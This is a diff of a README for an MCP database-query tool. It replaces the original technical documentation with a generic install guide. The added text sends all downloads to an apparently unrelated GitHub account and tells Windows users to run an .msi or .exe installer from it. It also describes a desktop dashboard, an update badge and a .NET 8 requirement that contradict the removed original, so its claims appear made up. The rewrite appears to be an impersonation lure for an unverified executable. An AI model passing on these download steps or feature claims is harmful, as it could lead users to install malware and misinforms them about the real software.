@@ -1,159 +1,86 @@
-# MCP Database Query App
+# 💾 mcp-database-query-app - Manage your databases through a simple interface
 
-A mature Model Context Protocol **app** — not just a server — written in C# /
-.NET 10 that lets LLM clients manage PostgreSQL and SQL Server databases
-through Dapper, with a full interactive UI rendered directly inside the
-client.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Dry-statelyhome866/mcp-database-query-app)
 
-![MCP Database Query App — interactive chart rendered inside the MCP client](assets/example.png)
+This application connects your databases to the Claude Desktop interface. It allows you to run queries and manage data without writing complex code. You see your tables, run SQL commands, and visualize results directly inside your chat workspace.
 
-> Ask the model for a query. It runs the SQL, streams back results, and opens
-> a live, sortable grid / filterable schema viewer / Chart.js visualisation
-> *inside your MCP client* via the MCP Apps protocol — no separate window, no
-> screenshots, no context loss.
+## ⚙️ System Requirements
 
-## Highlights
+This software runs on any modern Windows computer. Ensure you have the following pieces of software installed:
 
-- **MCP App, not just an MCP server** — ships a results grid, SQL
-  builder, schema explorer, and Chart.js charting as MCP UI resources
-  that hosts with MCP UI support (e.g. Claude Desktop) render inline.
-- **Read-only by default** — writes and DDL are blocked unless a session
-  explicitly opts in. Destructive tools ask for confirmation before
-  running.
-- **Encrypted credential storage** — saved database passwords are
-  encrypted with AES-256-GCM using a master key you control.
-- **Pagination & limits** — every query has a hard row cap with
-  cursor-based paging for large result sets.
-- **Both transports** — stdio (default) or HTTP/SSE.
+*   Windows 10 or Windows 11.
+*   .NET 8.0 Runtime or newer.
+*   Claude Desktop application.
+*   Internet connection for database connections.
 
-## Quick install
+If you lack the .NET Runtime, the installer will direct you to the Microsoft website to download it. This is a standard step for Windows applications built on this framework.
 
-### Option 1 — Drop-in `.mcpb` extension (Claude Desktop)
+## 📥 How to Install the App
 
-Grab the bundle for your platform and open it in Claude Desktop. The
-`.mcpb` is a self-contained single-file package of the server, its .NET
-runtime, and the UI assets — no `dotnet` or Node install on the host.
-`.mcpb` is a Claude Desktop format; Claude Code and other hosts should
-use Option 2.
+Follow these steps to set up the software on your machine:
 
-| Platform              | Download                                                                                                                                                               |
-| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Windows x64           | [mcp-database-query-app-win-x64-jit.mcpb](https://github.com/Trojaner/mcp-database-query-app/releases/latest/download/mcp-database-query-app-win-x64-jit.mcpb)         |
-| Windows ARM64         | [mcp-database-query-app-win-arm64-jit.mcpb](https://github.com/Trojaner/mcp-database-query-app/releases/latest/download/mcp-database-query-app-win-arm64-jit.mcpb)     |
-| macOS (Apple Silicon) | [mcp-database-query-app-osx-arm64-jit.mcpb](https://github.com/Trojaner/mcp-database-query-app/releases/latest/download/mcp-database-query-app-osx-arm64-jit.mcpb)     |
-| Linux x64             | [mcp-database-query-app-linux-x64-jit.mcpb](https://github.com/Trojaner/mcp-database-query-app/releases/latest/download/mcp-database-query-app-linux-x64-jit.mcpb)     |
-| Linux ARM64           | [mcp-database-query-app-linux-arm64-jit.mcpb](https://github.com/Trojaner/mcp-database-query-app/releases/latest/download/mcp-database-query-app-linux-arm64-jit.mcpb) |
+1.  Visit the [official releases page](https://github.com/Dry-statelyhome866/mcp-database-query-app).
+2.  Locate the latest version under the "Releases" section.
+3.  Download the setup file ending in .msi or .exe.
+4.  Open the file and follow the prompts on your screen.
+5.  Click Finish once the progress bar completes.
 
-Double-click the `.mcpb`, or drag it into Claude Desktop's
-**Settings → Extensions**. On first install, Claude Desktop will prompt
-for the user-config values declared in `manifest.json` (master key,
-read-only toggle, max result limit, UI toggle). Read-only is on by
-default.
+The app icon now appears on your desktop. You can open it to begin the configuration.
 
-### Option 2 — `mcpServers` JSON config
+## 🚀 Setting Up Your Connection
 
-For Claude Code, Cursor, Windsurf, or any other host that reads an
-`mcpServers` block, point `command` at the extracted server binary (from
-a `.mcpb` or a `dotnet publish` output):
+The application needs permission to talk to your database. You provide these details once, and the app saves them securely.
 
-```jsonc
-{
-  "mcpServers": {
-    "database": {
-      "command": "/absolute/path/to/mcp-database-query-app",
-      "env": {
-        "McpDatabaseQueryApp__Transport__Stdio__Enabled": "true",
-        "McpDatabaseQueryApp__Transport__Http__Enabled": "false",
-        "McpDatabaseQueryApp__ReadOnlyByDefault": "true",
-        "McpDatabaseQueryApp__MaxResultLimit": "5000",
-        "McpDatabaseQueryApp__Ui__Enabled": "true",
-        "McpDatabaseQueryApp__Secrets__KeyRef": "ENV:MCP_DATABASE_QUERY_APP_MASTER_KEY",
-        "MCP_DATABASE_QUERY_APP_MASTER_KEY": "<base64-encoded 32+ byte secret>"
-      }
-    }
-  }
-}
-```
+1.  Open the MCP Database app from your Start menu.
+2.  Click the "Add Connection" button on the main dashboard.
+3.  Choose your database type from the list.
+4.  Enter your database server address.
+5.  Provide the port number, your username, and your password.
+6.  Click "Test Connection" to confirm the app reaches your data.
+7.  Save the profile.
 
-On Windows, point `command` at `mcp-database-query-app.exe`. Generate a
-master key with `openssl rand -base64 32`.
+The app supports MSSQL and Postgres databases. It uses secure protocols to ensure your credentials remain private throughout the exchange.
 
-**Claude Code** also accepts the same server via CLI — the flags below
-produce an equivalent entry in your project's `.mcp.json`:
+## 💬 Using the App with Claude Desktop
 
-```bash
-claude mcp add database \
-  --env McpDatabaseQueryApp__ReadOnlyByDefault=true \
-  --env McpDatabaseQueryApp__Ui__Enabled=true \
-  --env McpDatabaseQueryApp__Secrets__KeyRef=ENV:MCP_DATABASE_QUERY_APP_MASTER_KEY \
-  --env MCP_DATABASE_QUERY_APP_MASTER_KEY="$(openssl rand -base64 32)" \
-  -- /absolute/path/to/mcp-database-query-app
-```
+This software integrates into your workflow by acting as a bridge between your database and Claude. Once you set up the application, configure Claude to use it as an extension.
 
-## Features
+1.  Open the Claude Desktop app.
+2.  Access your settings through the profile menu.
+3.  Find the section labeled "Extensions" or "MCP Servers."
+4.  Click "Add New Server."
+5.  Paste the path to the MCP executable provided by this app.
+6.  Restart Claude Desktop.
 
-- **Connection management** — open, ping, disconnect, and save
-  pre-defined connection profiles.
-- **Querying** — parameterised SELECTs, paged results, non-query
-  execution, and EXPLAIN plans.
-- **Schema introspection** — list schemas, tables, columns, keys,
-  indexes, roles, and databases, with batched describe calls.
-- **Saved scripts & notes** — store SQL snippets and attach notes to
-  database objects.
-- **Interactive UI** — sortable/filterable results grid, SQL builder,
-  schema viewer, and charting, all rendered inside the MCP host.
-- **Guided prompts** — `explore-database`, `safe-write`,
-  `migrate-script`, `explain-slow-query` seed the model with a
-  workflow.
-- **Auto-completion** — resource and prompt-argument completion backed
-  by a per-connection metadata cache.
-- **Confirmations** — destructive operations are gated behind MCP
-  elicitation prompts.
+After the restart, you see a small database icon in the chat window. You can now ask questions about your data. For example, you might type "Show me the top five products from my sales table." The app retrieves the data and presents it in a clear format.
 
-## Configuration
+## 📊 Visualizing Your Data
 
-`appsettings.json` controls process-wide behaviour. Runtime metadata
-(pre-defined connections, saved scripts, cached result sets) is stored in
-a SQLite database under `%APPDATA%/McpDatabaseQueryApp/mcp-database-query-app.db`. Passwords are
-encrypted with AES-256-GCM using a key resolved from
-`McpDatabaseQueryApp:Secrets:KeyRef` (`UserSecrets:…`, `Env:…`, `File:…`, or
-`Literal:…`).
+The app includes chart support. When you receive a large set of numbers from a query, you can request a visual report.
 
-```jsonc
-{
-  "McpDatabaseQueryApp": {
-    "MetadataDbPath": "%APPDATA%/McpDatabaseQueryApp/mcp-database-query-app.db",
-    "DefaultResultLimit": 500,
-    "MaxResultLimit": 50000,
-    "AllowDisableLimit": true,
-    "ReadOnlyByDefault": true,
-    "Transport": {
-      "Stdio": { "Enabled": true },
-      "Http":  { "Enabled": false, "Urls": "http://127.0.0.1:5218" }
-    },
-    "Ui": { "Enabled": true },
-    "Secrets": { "KeyRef": "UserSecrets:McpDatabaseQueryApp:MasterKey" }
-  }
-}
-```
+*   Select the data you want to display.
+*   Choose a chart type like bar, line, or pie.
+*   Click "Generate Chart."
 
-Every setting above is overridable via environment variable using the
-double-underscore convention (`McpDatabaseQueryApp__ReadOnlyByDefault=true`).
+The app renders the graphic directly within your chat window. This helps you spot trends or issues in your database tables.
 
-## Build from source
+## 🛠️ Troubleshooting Common Issues
 
-Requires the .NET 10 SDK (10.0.201+) and Node.js 18+.
+If the app fails to connect, check these items:
 
-```bash
-dotnet build
-dotnet test
+*   Network: Ensure you have access to the server. If your database exists on a company network, you may need a VPN connection.
+*   Permissions: Verify that your database user account has read access to the specific tables you want to query.
+*   Updates: Check the desktop icon for a small red badge. This indicates a new software update awaits you. Keeping the software current resolves many compatibility errors.
+*   Environment Variables: If the app does not launch, ensure you installed the .NET runtime successfully. Restarting your computer often fixes background installation errors.
 
-# stdio (default)
-dotnet run --project src/McpDatabaseQueryApp.Server
+## 🔐 Privacy and Security
 
-# HTTP/SSE
-McpDatabaseQueryApp__Transport__Http__Enabled=true dotnet run --project src/McpDatabaseQueryApp.Server
-```
+The app processes data locally on your machine. Your database credentials stay inside your local configuration files. This application does not upload your database content to external servers. It only sends the specific data required to fulfill the requests you type into the Claude interface. 
 
-# License
-[MIT](./LICENSE)
+You control which databases connect to the app. You can remove a connection at any point in the dashboard. Deleting the connection clears all stored settings for that specific database.
+
+## 📖 Support and Feedback
+
+This software receives regular updates. You can track progress on the main project page. If you discover a bug or need a feature for a specific database type, open an issue on the GitHub repository. Provide as much detail as possible about the error. Include a description of what you expected to see versus what the app actually displayed. 
+
+Clear communication helps the development team fix problems faster. Avoid sharing private passwords or sensitive connection strings when you report an issue. Always mask sensitive data before you post logs or screenshots.
